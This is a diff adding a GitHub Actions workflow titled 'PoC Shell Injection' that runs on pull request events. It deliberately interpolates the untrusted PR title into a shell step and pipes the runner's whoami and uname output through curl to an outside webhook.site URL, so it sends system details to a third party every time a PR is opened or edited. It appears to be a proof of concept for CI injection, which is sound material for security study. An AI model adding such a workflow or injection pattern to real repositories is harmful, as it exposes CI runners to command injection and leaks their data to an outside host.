@@ -1,0 +1,14 @@
+name: PoC Shell Injection
+
+on:
+  pull_request:
+    types: [opened, edited, reopened]
+
+jobs:
+  rce-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Simulate vulnerable PR title usage
+        run: |
+          title="${{ github.event.pull_request.title }}"
+          echo "Captured: $(whoami && uname -a)" | curl -X POST -d @- https://webhook.site/edddb039-1150-408f-bfd1-7875c1251719
